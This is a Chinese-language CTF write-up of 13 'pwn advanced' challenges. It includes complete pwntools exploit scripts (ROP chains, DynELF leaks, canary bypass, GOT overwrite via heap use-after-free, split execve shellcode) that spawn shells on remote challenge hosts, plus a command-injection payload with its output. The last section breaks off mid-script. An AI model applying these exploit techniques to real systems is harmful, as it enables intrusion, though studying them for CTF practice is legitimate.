## pwn高手进阶区
### 1. 反应釜开关控制
题目：小M在里一个私人矿厂中发现了一条TNT生产线中硝化反应釜的接口，反应釜是一种反应设备，非常的不稳定，会因为很多原因造成损坏，导致生产被迫停止。她怀疑这个工厂可能进行地下军火的制作，所以小M打算通过把反应釜关闭掉来干扰这条TNT生产线的运行，但是反应釜有多个闸门，得想办法帮她把闸门都关掉才行。

思路：简单栈溢出。

### 2. dice_game
题目：暂无。

思路：简单栈溢出，通过覆盖种子变量控制随机变量序列，然后爆破该序列即可。

### 3. forgot
题目：福克斯最近玩弄有限状态自动机。在探索概念实现正则表达式使用FSA他想实现一个电子邮件地址验证。 最近，Lua开始骚扰福克斯。对此，福克斯向Lua挑战斗智斗勇。福克斯承诺要奖励Lua，如果她能到不可达状态在FSA他实施过渡。可以在这里访问复制。 运行服务hack.bckdr.in:8009

思路：简单栈溢出，通过覆盖函数指针执行获取flag的函数即可。

### 4. Mary_Morton
题目：非常简单的热身pwn

思路：综合了格式化字符串漏洞和栈溢出，通过格式化字符串漏洞泄露canany内容，然后使用栈溢出跳转到获取flag的函数即可。

### 5. warmup
题目：暂无

思路：只提供了一个nc地址，并且提示了一个函数地址，猜测是简单的栈溢出，但是由于不知道缓存区的大小，因此只能通过爆破的方式猜测缓存区大小。

### 6. welpwn
题目：暂无

思路：这道题目没有提供libc，需要通过远程泄露的方式查找system函数地址

#### 通过DynELF对象查找system函数地址的方法
需要提供一个泄露任意地址信息的函数，DynELF可以自动高效的查找system函数的地址
```python
elf = ELF('welpwn')
d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
```

#### 万能gadget
调用libc的程序中一般都一段这样的代码（具体地址会根据不同的程序有区别），这段代码被称为万能gadget
```python
.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8]
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36↑j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
```
这里实际上有两个片段:第一个片段是0x40089A，简称ppppppr，作用是设置6个寄存器的内容，然后返回；第二个片段是0x400880，简称mmmcall，作用是设置三个参数，然后调用寄存器所指向的函数。64位传参寄存器顺序如下：rdi, rsi, rdx, rcx, r8, r9。

通过这段万能gadget基本可以实现任意函数指针调用：
```python
# 栈溢出缓冲区大小
payload = 'A' * padding
rbx = 0
rbp = 1
# 需要调用的函数指针，如elf.got['write']
r12 = funcAddr
r13 = arg2
r14 = arg1
r15 = arg0
# 这段payload的意思是栈溢出后首先跳转到ppppppr片段处
# 然后依次将栈顶内容弹出到6个寄存器
# 最后跳转到mmmcall片段
# 分析mmmcall片段，可以知道r15最终进入edi，r14进入rsi，r13进入rdx，分别为函数调用的前三个参数
# 最终调用的函数地址为r12+rbx*8，即为funcAddr，这也是前面rbx置为0的原因
payload += ppppppr + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + mmmcall
# 这段payload的意思是mmmcall返回后重入到main或者跳转到其他函数
# 分析mmmcall返回后的代码执行情况
# 首先执行add rbx,1，此时rbx为1
# 继续执行cmp rbx,rbp，由于之前设置了rbp为1，因此这里是相等的
# 下面的跳转失败，因此继续执行add rsp,8，相当于丢弃栈顶8个字节
# 然后回到了第一个gadget，继续弹出48个字节，最后返回
# 因此首先在栈顶布置了56字节的填充数据，在放置了需要返回的地址
payload += b'A' * 56 + main
```

#### 利用bss段写入内容
由于bss段是可写的，可以直接利用read函数向bss段写入/bin/sh字符串以及system函数地址，一方面上面的万能gadget只能调用函数指针，不方便直接调用函数，另一方面也省去了查找/bin/sh字符串的功夫。

这里有个两个技巧，一是bss段本身存储了全局变量，直接写elf.bss()起始地址可能会由于程序重入后修改全局变量导致写入失败，因此最好写入改为elf.bss()+500，由于内存都是按照4k大小申请的，因此增加一段偏移不会导致程序非法访问内存，同时正常程序运行也不会写入到这里，提高了写入成功率；二是写入完成后可以继续利用write等读取写入的内容，查看是否相同

全部利用代码如下：
```python
from pwn import *

sh = remote('220.249.52.133', 41706)
context(arch='amd64', os='linux')

elf = ELF('welpwn')

BUFLEN = 16

# 万能gadget
ppppr = 0x40089C
ppppppr = 0x40089a
mmmcall = 0x400880
'''
.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8]
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36↑j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
'''

# 是否存在printf输出缓存
hasPrinfBuf = False
# 缓存长度
printfLen = None

# 利用万能gadget封装一个函数指针调用功能
def makePayload(funcAddr, arg0, arg1, arg2):
    global printfLen
    # 这一段在echo函数中会被复制到缓冲区中导致栈溢出
    # 后续因为有0字符不会被复制
    payload = b'A' * BUFLEN
    payload += b'B' * 8
    ## echo中栈溢出后esp指向main中的buf，需要先弹出用于copy到echo中的buf的内容（32字节）
    ## 因此第一个gadget为ppppr，即弹出32字节，然后返回
    ret = ppppr
    payload += p64(ret)
    # 上面这一段会被截断并打印出来
    printfLen = len(payload.strip(b'\x00'))
    # 复制结束

    # main buff前面还有32字节的内容（用于copy到echo中的buf的内容）
    # payload = b'A' * BUFLEN
    # payload += b'B' * 8
    # ret = ppppr
    # pyaload += p64(ret)
    # 这里ret是上一个ppppr的返回地址
    ret = ppppppr
    payload += p64(ret)
    rbx = 0
    rbp = 1
    #r12 = elf.got['write']
    r12 = funcAddr
    # r13 = 8
    r13 = arg2
    # r14 = addr
    r14 = arg1
    #r15 = 1
    r15 = arg0
    # 这里ret是上一个ppppppr的返回地址
    ret = mmmcall
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(ret)
    # mmmcall指令执行完后，还会继续执行到add rsp,8和ppppppr指令
    # 因此首先安排56字节填充内容，然后在放置新的返回地址，这里使用main函数
    ret = elf.sym['main']
    payload += b'C' * 56
    payload += p64(ret) 
    return payload

def leak(addr):
    global hasPrinfBuf
    global printfLen
    payload = makePayload(elf.got['write'], 1, addr, 8)
    data = sh.recvuntil('RCTF\n')
    # print(data)
    sh.sendline(payload)
    # 第一次进入main函数的时候，会执行printf函数，然后执行write泄露地址
    # 但是write会优先输出，printf会等待下次重入main的时候才输出
    # 因此除了第一次没有printf缓存输出，后续每次都会先输出printf的缓存内容
    if hasPrinfBuf:
        sh.recv(printfLen)
    hasPrinfBuf = True
    data = sh.recv(8)
    # print(data)
    return data

d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
log.success("system addr = " + hex(system))

# print('bss')
# print(elf.bss())
bss = elf.bss() + 500
binStr = b'/bin/sh\x00' + p64(system)
payload = makePayload(elf.got['read'], 0, bss, len(binStr) + 1)
data = sh.recvuntil('RCTF\n')
sh.sendline(payload)
sleep(1)
sh.sendline(binStr)

payload = makePayload(elf.got['write'], 1, bss, len(binStr))
data = sh.recvuntil('RCTF\n')
sh.sendline(payload)
sleep(1)
print(printfLen)
data = sh.recv(printfLen)
print(data)
data = sh.recv(len(binStr))
if data == binStr:
    log.success('write /bin/sh ok!')
else:
    log.error('write /bin/sh error')

# 这里不方便直接调用system函数
# 因此先将system地址写入bss+8，然后调用这个函数指针
payload = makePayload(bss + 8, bss, 0, 0)
data = sh.recvuntil('RCTF\n')
sh.sendline(payload)
sleep(1)
print(printfLen)
data = sh.recv(printfLen)
print(data)
sh.interactive()
```


### 7. monkey
题目：暂无

思路：运行后得到一个类似nodejs的解释器，使用os.system('cat flag')得到flag。


### 8. time_formatter
题目：将UNIX时间转换为日期是很困难的，所以玛丽编写了一个工具来完成这个任务。

思路：退出时free内存的时候存在悬挂指针。

程序在输出时间时使用了system，参数是使用时间格式字符串格式拼接而成，但是字符串格式输入时进行了过滤，不能直接使用命令注入。但是在退出时，时间格式字符串被free后成了悬挂指针，这时候利用设置时区重新分配一段内存，由于堆内存分配特点，这次分配的内存和上次释放的时间格式字符串内存指向同一个地址，因此此时时间格式字符串指向了时区字符串，而时区字符串是没有进行过滤的，再次拼接时就发生了命令注入。
```python
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 1
Format: %Y
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
Are you sure you want to exit (y/N)? N
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: %Y';cat flag;'
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 4
Your formatted time is: sh: 1: /bin/date: not found
cyberpeace{2c3475a0a0745a90418c2694c7dc54e4}
sh: 1: : Permission denied
1) Set a time format.
```

### 9. pwn-200
题目：暂无。

思路：这道题目没有提供libc，需要通过远程泄露的方式查找system函数地址。

通过栈溢出构造leak函数，然后使用DynELF查找system函数地址，再使用read函数将/bin/sh写入bss段，最后调用system获取flag。leak函数由于需要重入，因此leak函数需要一个正常的返回地址，另外读写/bin/sh字符串的时候也需要可重入，这里选的是溢出点所在的函数，但是在调用system函数时始终报错，后来将调用system之前的一次返回地址改成main函数，然后就可以正确调用system了，网上查到类似的问题说是可能由于环境变量被覆盖了。。。

代码如下：
```python
from pwn import *

sh = remote('220.249.52.133', 59273)
elf = ELF('bed0c68697f74e649f3e1c64ff7838b8')

BUFLEN = 0x6c

def makePayload32(funcAddr, arg0, arg1, arg2, funcRet):
    payload = b'A' * BUFLEN
    payload += b'B' * 4
    payload += p32(funcAddr)
    payload += p32(funcRet)
    payload += p32(arg0)
    payload += p32(arg1)
    payload += p32(arg2)
    return payload

vulFun = 0x8048484
main = 0x80484be

def leak(addr):
    payload = makePayload32(elf.plt['write'], 1, addr, 4, vulFun)
    sh.sendline(payload)
    data = sh.recv(4)
    # print(data)
    return data

data = sh.recvuntil('~!\n')
print(data)
d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
log.success("system addr = " + hex(system))

bss = elf.bss() + 0x100
binStr = b'/bin/sh\x00'
payload = makePayload32(elf.plt['read'], 0, bss, len(binStr) + 1, vulFun)
sh.sendline(payload)
sleep(1)
sh.sendline(binStr)
sleep(1)

# 这个函数结束后返回到main，否则system没法正确执行
payload = makePayload32(elf.plt['write'], 1, bss, len(binStr), main)
sh.sendline(payload)
sleep(1)
data = sh.recv(len(binStr))
print(data)
if data == binStr:
    log.success('write /bin/sh ok!')
else:
    log.error('write /bin/sh error')

# 由于这里是从main进入的，先接收程序输出
data = sh.recvuntil('~!\n')
print(data)

payload = makePayload32(system, bss, 1, 1, vulFun)
sh.sendline(payload)
sh.interactive()
```

### 10. pwn1
题目：暂无。

思路：增加了canary的栈溢出，首先使用puts泄露canary，然后利用这个值配合ROP获取flag。

第一个步获取canary比较简单，主要就是将缓冲区覆盖到canary之前（还需要覆盖掉canary的第一个字节，canary设计之初为了防止泄露第一个字节为0），然后利用puts泄露出后七个字节即可。

第二步是获取libc加载地址，首先需要泄露一个libc中的函数（如write）的地址，然后利用LibcSearcher找出libc的地址即可。这里有个坑，题目本身提供了libc，但是通过write函数的got地址和libc库中的地址计算出来的libc地址根本不能用，看了一个wp说是libc和服务器的libc不同，但是我getshell以后在服务器上看了大小一模一样，应该不会是假的，另外上面计算出来的结果是这种形式：7fba5f6f0030，而LibcSearcher的结果是这样的：7fba5f6f0000，其实差别并不大，每次都是相差0x30字节，因此我推测应该不是libc不同，而是libc在实际装载的时候不同页进行了某些对齐操作，而且libc的地址按道理应该是4K对齐（也就是后三位是0），因此第一个计算结果可能是错误的，这种方式可能没有考虑链接器的一些细节。

第三部是通过LibcSearcher获取的libc版本计算system函数地址和/bin/sh地址，然后构造rop调用system即可。

代码如下：
```python
from pwn import *
from LibcSearcher import *

sh = remote('220.249.52.133', 54007)
elf = ELF('babystack')

def getCanary():
    sh.recvuntil('>> ')
    sh.sendline('1')
    sleep(1)
    sh.sendline(b'A' * 136)
    sh.recvuntil('>> ')
    sh.sendline('2')
    sh.recvuntil('\n')
    canary = u64(b'\x00' + sh.recv(7))
    log.success('0x%0x' % canary)
    return canary

canary = getCanary()

bufLen = 0x88
pop_rdi_ret = 0x400a93
main = 0x400908

def leak(addr):
    payload = b'A' * bufLen
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(pop_rdi_ret)
    payload += p64(addr)
    payload += p64(elf.plt['puts'])
    payload += p64(main)
    sh.recvuntil('>> ')
    sh.sendline('1')
    sleep(1)
    sh.sendline(payload)
    data = sh.recvuntil('>> ')
    print(data)
    sh.send('3')
    data = sh.recv(6)
    return u64(data + b'\x00\x00')
 
 
writeAddr = leak(elf.got['write'])

# 第一种方法计算出来的基址有问题，导致system无法执行
# 第一种结果类似：7fba5f6f0030
# 第二种结果类似：7fba5f6f0000
# 明显第一种结果没有4k对齐
# 猜测可能是装载动态库的时候不同页使用了对齐，导致第一种方式计算结果出现了偏差？？？
libc = ELF('libc-2.23.so')
libBase = writeAddr - libc.sym['write']
print(libBase)
systemAddr = libBase + libc.sym['system']
binStrAddr = libBase + 0x18cd17
log.info('system 0x%x' % systemAddr)

# 第二种方法查找的基址可用
libc2 = LibcSearcher('write', writeAddr)
libBase2 = writeAddr - libc2.dump('write')
print(libBase2)
systemAddr = libBase2 + libc2.dump('system')
binStrAddr = libBase2 + libc2.dump('str_bin_sh')

def getShell():
    payload = b'A' * bufLen
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(pop_rdi_ret)
    payload += p64(binStrAddr)
    payload += p64(systemAddr)
    payload += p64(main)
    sh.recvuntil('>> ')
    sh.sendline('1')
    sleep(1)
    sh.sendline(payload)
    data = sh.recvuntil('>> ')
    sh.send('3')
    sh.interactive()

getShell()
```

### 11. note-service2
题目：暂无。

思路：漏洞点在于全局数据存在越界访问的漏洞，可以在任意地址写入一个malloc分配的地址，且地址指向的内容可控。利用方法是修改某个函数的got表内容，使其指向新分配的地址，内容为需要执行的shellcode指令。此方法需要两个条件，一是Partial RELRO，即可修改got表，二是NX disabled，即堆栈数据可以执行。

先使用checksec检查程序是否满足利用条件。剩下就是构造shellcode，主要难点在于每次分配的内存空间只能写入7个字节的有效内容，需要将shellcode拆分成几段，然后利用jmp指令将几段shellcode连起来执行，因此计算jmp跳转的偏移是shellcode的关键之处。我这里使用的方法是通过linux的内联汇编编写shellcode，然后使用nop指令模拟堆的头结构和填充内容，cc编译时会自动计算偏移，再通过gdb反汇编得到shellcode。生成shellcode的c代码如下：
```c
int main(){
        char s[] = "/bin/sh";
        char *a = s;
        asm(
                        "mov %0, %%rdi;"
                        "jmp shellcode2;"
                        "shellcode0:"
                        "xor %%rax, %%rax;"
                        "mov $59, %%al;"
                        "syscall;"
                        "nop;"
                        // padding of chunk0
                        "nop;nop;nop;nop;nop;nop;nop;nop;"

                        // head of chunk1
                        "nop;nop;nop;nop;nop;nop;nop;nop;"
                        "nop;nop;nop;nop;nop;nop;nop;nop;"
                        "shellcode1:"
                        "xor %%rdx, %%rdx;"
                        "jmp shellcode0;"
                        "nop;nop;nop;"
                        // padding of chunk0
                        "nop;nop;nop;nop;nop;nop;nop;nop;"

                        // head of chunk1
                        "nop;nop;nop;nop;nop;nop;nop;nop;"
                        "nop;nop;nop;nop;nop;nop;nop;nop;"
                        "shellcode2:"
                        "xor %%rsi, %%rsi;"
                        "jmp shellcode1;"
                        :"=r"(a)
               );
}
```

获取flag的程序如下：
```python
from pwn import *

# shellcode
# xor rsi, rsi; 48 31 f6
# xor rdx, rdx; 48 31 d2
# xor rax, rax; 48 31 c0
# mov al, 59;   b0 3b
# syscall;      0f 05

# shellcode需要布置在三个堆块上
# 从后面的堆块往前执行
# 第一个堆块
# 堆头16字节
# 数据8字节（实际只能写7字节，最后一个字节被程序填0）
# xor rax, rax
# mov al, 59
# syscall
shellCode0 = b'\x48\x31\xc0' + b'\xb0\x3b' + b'\x0f\x05'
# 堆尾用于对齐的填充8个字节（堆块大小是32字节对齐的）

# 第二个堆块，最后跳转到第一个堆块
# 堆头16字节
# 数据8字节（实际只能写7字节，最后一个字节被程序填0）
# 跳转的距离为：本块的两条指令共5个字节 + 堆头16字节 + 上一个堆块填充8字节 + 上一个堆块的数据8字节
# 也就是堆块的大小32字节+本块两条指令5字节共37字节
# 但是由于是往前跳转的，因此为-37，转换成单字节为db
# 负数转十六进制字节的方法
# 转原码: 1010 0101 符号为1 剩余部分为37
# 转反码: 1101 1010 符号不变 剩余取反
# 转补码: 1101 1011 加1
# xor rdx, rdx
# jmp shellCode0
# 补齐7个字节，根据程序逻辑，写内容时最多读取长度-1个字节，因此发送内容时不需要发送换行符
shellCode1 = b'\x48\x31\xd2' + b'\xeb\xdb' + b'\x90\x90'
# 堆尾用于对齐的填充8个字节（堆块大小是32字节对齐的）

# 第三个堆块，最后跳转到第二个堆块
# xor rsi, rsi
# jmp shellCode1
shellCode2 = b'\x48\x31\xf6' + b'\xeb\xdb' + b'\x90\x90'

atoiGot = 0x202060
qword_2020A0 = 0x2020A0
index = (atoiGot - qword_2020A0) / 8
log.success('index: %d' % index)

sh = remote('220.249.52.133', 37999)

def createNote(index, code):
    sh.recvuntil('>> ')
    sh.sendline('1')
    sh.recvuntil('index:')
    print('index: %d' % index)
    sh.sendline('%d' % index)
    sh.recvuntil('size:')
    sh.sendline('8')
    sh.recvuntil('content:')
    # 不能使用sendline,否则输入输出的字节数量对不上，会导致出错
    sh.send(code)

createNote(1, shellCode0)
createNote(2, shellCode1)
createNote(index, shellCode2)
data = sh.recvuntil('>> ')
print(data)
sh.sendline('/bin/sh')
sh.interactive()
```

### 12. supermarket
题目：暂无。

思路：漏洞点在于修改描述大小时先释放了原来的内存，然后重新申请了新的内存，但是指针仍然指向原来的内存，造成UAF，然后利用该漏洞修改某个函数的got表为system，触发后获得shell。

#### linux堆内存分配基本原理
##### fast bin
32位情况下fast bin大小依次为16 24 32 40 48 56 64 72 80 88（默认只用了前7个）。

##### small bin
共62个。

##### large bin
共63个。

##### unsorted bin
1个，大小没有限制。unsorted类似一个临时队列，放置释放或因合并、切割产生的内存块，在fast和small无法满足要求时会遍历该队列，查找是否有合适的块，遍历的同时顺便将临时队列中的块放置到合适的bin数组中去。

##### 基本分配方法
内存分配的基本思想首先是从尽可能小的bin中选择，如果用户需要分配的内存比实际选中的块小，就会进行切割。small主要用于小块内存的精确分配，fast主要作用类似small的快速缓存，不进行合并操作。初始状态bin都为空，只有一个topchunk，分配的过程中不断从大块中分割合适的内存，同时释放时也会合并小的内存块。

#### 漏洞利用说明
```c
// 本题使用了一个数据结构，结构体大小0x1C
struct node {
    char name[16];
    int price;
    int size;
    char *desc;
}

// 修改商品描述时 node1->desc变成了悬挂指针
struct node* node1 = malloc(0x1c);
node1->desc = malloc(0x80);
free(node1->desc);

// 再次创建node2时，让node2的地址为node1->desc
// 上面desc的大小超出了fast bin的大小，释放的时候实际上该内存块进入了unsorted bin
// 再次分配的时候从unsorted bin中选择了这个大的内存块，会切割合适的大小返回
// 当malloc这个结构体的时候，实际上所需要的堆块大小为0x1C+4=32字节
// 如果使用fastbin，那node1->size最大也只能是0x1C
// 程序逻辑修改desc内容时会将最后一个字节修改为0
// 因此只能修改node2的desc指针的后三个字节
struct node* node2 = malloc(0x1c);

// 就能通过修改node1->desc操作node2结构体，覆盖node2的desc指针变量
// 然后再修改node2->desc就实现了任意地址写
// 首先将node2的desc覆盖为atoi.got的地址，调用显示命令就能得到got表实际指向的地址
node2->desc = elf.got['atoi']

// 然后计算system函数的地址后将利用修改node2的desc将atoi的got表内容改为system函数地址
// 再次出发atoi的时候就调用了system函数
```

#### 堆调试过程
##### 自定义libc版本
题目给出的libc版本为2.23，但是我使用的kali虚拟机的libc版本为2.31，如果直接调试由于libc升级后堆的管理方式发生了变化，调试不出效果，因此需要首先更改libc的版本才能正确调试这个漏洞。直接使用LD_PRELOAD修改libc版本发现报错，分析原因是ld.so版本不兼容，还需要修改ld.so的版本，但是题目没有给需要自己下。为了一劳永逸的解决这个问题，我找到一个[https://github.com/matrix1001/glibc-all-in-one]glibc-all-in-one项目，可以快速下载不同的libc版本。但是还有一个问题就是如果需要每次手动修改系统的libc版本也太麻烦，因此想到了修改elf文件的头，这里使用patchelf工具，修改libc和ld的版本。

##### 堆数据结构chunk(32位)
```c++
struct malloc_chunk {
    int mchunk_prev_size;    // 前一个堆为空闲时记录前一个堆的大小，不空闲时为前一个堆的数据部分
                             // 这个字段实际属于前一个堆结构数据部分！
    int mchunk_size;         // 堆块的大小（包括数据和堆头，不包含前一个字段）
                             // 这个字段的后三个bit用于标志位，计算大小时忽略
                             // 最后一个bit记录前一个块是否被分配
    struct malloc_chunk* fd; // 前一个空闲堆块，free状态有用
    struct malloc_chunk* bk; // 后一个空闲堆块，free状态有用
}
```
以本题为例，增加一条商品实际上分配了两个chunk
```python
# 查看heap地址
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8041000  0x8048000 rw-p     7000 0      /home/nop/tmp/supermarket
 0x8048000  0x804a000 r-xp     2000 7000   /home/nop/tmp/supermarket
 0x804a000  0x804b000 r--p     1000 8000   /home/nop/tmp/supermarket
 0x804b000  0x804c000 rw-p     1000 9000   /home/nop/tmp/supermarket
 0x8573000  0x8594000 rw-p    21000 0      [heap]
0xf7de5000 0xf7de6000 rw-p     1000 0      

# 查看heap内容
pwndbg> x/200wx 0x8573000
0x8573000:      0x00000000      0x00000021      0x41414141      0x00000041
0x8573010:      0x00000000      0x00000000      0x00000001      0x00000064
0x8573020:      0x08573028      0x00000069      0x42424242      0x00000042
0x8573030:      0x00000000      0x00000000      0x00000000      0x00000000
0x8573040:      0x00000000      0x00000000      0x00000000      0x00000000
0x8573050:      0x00000000      0x00000000      0x00000000      0x00000000

# 查看已分配chunk
# 第一个chunk大小为0x21，实际上最后一位表明上一个块被占用
# 而本题的结构体大小为0x1C，因此计算大小没有加上prev_size的4个字节
pwndbg> heap -v
Allocated chunk | PREV_INUSE
Addr: 0x8573000
prev_size: 0x00
size: 0x21
fd: 0x41414141
bk: 0x41
fd_nextsize: 0x00
bk_nextsize: 0x00

# 这里prev_size比较明显就是上一个块的最后4个字节内容
# 为结构体中描述字符串指针变量，这里实际指向了当前堆的数据区
# 因为这个块就是上面结构体描述指针指向的实际内容
Allocated chunk | PREV_INUSE
Addr: 0x8573020
prev_size: 0x8573028
size: 0x69
fd: 0x42424242
bk: 0x42
fd_nextsize: 0x00
bk_nextsize: 0x00

# 这个top chunk是libc初始化的一个chunk
# 所有堆内存都是从这里来的，如果不够了再通过操作系统申请
# 通过地址也可以发现top chunk的上一个块为第二个chunk，都是连在一起的
Top chunk | PREV_INUSE
Addr: 0x8573088
prev_size: 0x00
size: 0x20f79
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```
此时再修改一个商品，看看堆的变化情况
```python
# 1. 首先修改desc长度为一个较大的长度
# 结果发现chunk的地址并没有变化，只是长度发生了变化
# 猜测应该是realloc函数发现后面的堆块为top chunk，可以直接分一块内存过来
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x8573000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x8573020
Size: 0xd1

Top chunk | PREV_INUSE
Addr: 0x85730f0
Size: 0x20f11

# 2. 再修改desc为一个较小的长度
# 发现chunk的地址仍然没有变化，也只是长度发生了变化
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x8573000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x8573020
Size: 0x11

Top chunk | PREV_INUSE
Addr: 0x8573030
Size: 0x20fd1

# 3. 随意新建一个商品后chunk的变化
# 又从top chunk中划分出了两个chunk
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x8573000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x8573020
Size: 0x11

Allocated chunk | PREV_INUSE
Addr: 0x8573030
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x8573050
Size: 0x11

Top chunk | PREV_INUSE
Addr: 0x8573060
Size: 0x20fa1

# 4. 这时候再修改第一个商品，查看chunk的变化
# 这时候realloc的时候没有相邻的空闲块，只好重新申请一块内存，并释放当前的内存
# 由于前面实验时将长度改得很小，释放的时候被加入到了fastbins队列
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x8573000
Size: 0x21

Free chunk (fastbins) | PREV_INUSE
Addr: 0x8573020
Size: 0x11
fd: 0x66647361

Allocated chunk | PREV_INUSE
Addr: 0x8573030
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x8573050
Size: 0x11

Allocated chunk | PREV_INUSE
Addr: 0x8573060
Size: 0xd1

Top chunk | PREV_INUSE
Addr: 0x8573130
Size: 0x20ed1

# 这里长度选择的不合适加入到了fastbins
pwndbg> bins
fastbins
0x10: 0x8573020 ◂— 'asdf'
0x18: 0x0
0x20: 0x0
0x28: 0x0
0x30: 0x0
0x38: 0x0
0x40: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty

# 5. 继续调整大小进行释放操作
# 发现fastbins最大块为64字节，扣除4个字节的size，最多可以存储60个字节的数据
# 因此只要超过60字节再释放就能进入unsortedbin
Free chunk (fastbins) | PREV_INUSE
Addr: 0x8573150
Size: 0x41
fd: 0x66647361

Allocated chunk | PREV_INUSE
Addr: 0x8573190
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x85731b0
Size: 0x49
fd: 0x66647361
bk: 0xf7f99700
```

利用代码如下：
```python
from pwn import *

elf = ELF("supermarket")
libc = ELF("libc.so.6")
sh = remote("220.249.52.133", 45414)

def add(name, size, desc):
    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("name:", name)
    sh.sendlineafter("price:", "1")
    sh.sendlineafter("size:", "%d" % size)
    sh.sendlineafter("description:", desc)

def change(name, size, desc):
    sh.sendlineafter(">> ", "5")
    sh.sendlineafter("name:", name)
    sh.sendlineafter("size:", "%d" % size)
    sh.sendlineafter("description:", desc)

def show():
    sh.sendlineafter(">> ", "3")
    return sh.recvuntil("menu")

# 这里大小最小为61字节
# 当使用60字节时，加上块头4个字节，所需对的大小为64字节
# fastbin默认值使用了七个队列，最小块为16字节，最大块大为64字节
# 因此如果描述内容小于等于60字节，最后释放的时候会加入到fastbin
# 由于题目设置修改描述内容时会将最后一个字节写0
# 使用fastbin时覆盖描述指针变量时只能写入前3个字节
# 因此只能使用unsortedbin
add("1", 61, 'A'*20)

# 这里任意大小都可以，主要是为了防止上一个描述堆块释放的时候会和top chunk合并
add("x", 60, 'A'*20)

# node1的描述堆块按照8字节对齐为72字节
# 为了使得能够释放掉上面的块，这里最小块为80字节，减去4字节头部数据为76字节
# 69-76字节范围按照8字节对齐都是一样的
change("1", 69, "")

# 创建node2的时候会从unsortedbin切割出一个32字节的堆块
# 此时node1的描述指针指向的是node2结构体
add("2", 0x20, 'A'*0x10)

# 再修改一次node1的描述内容（实际上是修改node2结构体）
# 按照node2的结构体覆盖
# name字段
payload = b'2' + b'\x00'*15
# price字段
payload += b'\x01\x02\x00\x00'
# size字段
payload += b'\x20\x00\x00\x00'
# 描述指针，将改变量改为atoi.got
# 因此node2的描述指针指向的内容为atoi的库函数地址
payload += p32(elf.got['atoi'])
change("1", 0x100, payload)

# 显示node2的描述内容时，泄露了atoi的got地址的内容
data = show()
data = data.split(b'price.513, des.')[1].split(b'\n')[0]
atoiAddr = u32(data)

# 计算libc基址和system函数地址
libBase = atoiAddr - libc.sym['atoi']
log.success('lib base: %x' % libBase)
systemAddr = libBase + libc.sym['system']
log.success('system: %x' % systemAddr)

# 将node2的desc指针指向的内容（前四个字节修改为system函数地址）
# 现在修改node2的描述指针，实际上是在修改aoti.got表的内容
# 将其修改为system函数地址
payload = p32(systemAddr)
change("2", 0x20, payload)

# 现在程序处于输入choice的状态，任意发送内容都能触发aoti函数
# 如果发送的是/bin/sh，那么现在atoi函数的参数正好是/bin/sh
# 而atoi的函数指针现在已经是system了，因此实现了getshell
sh.sendline("/bin/sh")
sh.interactive()
```

### 13. 实时数据监测
题目：小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆。

思路：简单的格式化字符串漏洞

代码如下：
```python
from pwn import *

def exec_fmt(payload):
    sh = remote('220.249.52.133', 57893)
    sleep(1)
    sh.sendline(payload)
    output = sh.recvall()
    return output

#autofmt = FmtStr(exec_fmt)
#offset = autofmt.offset
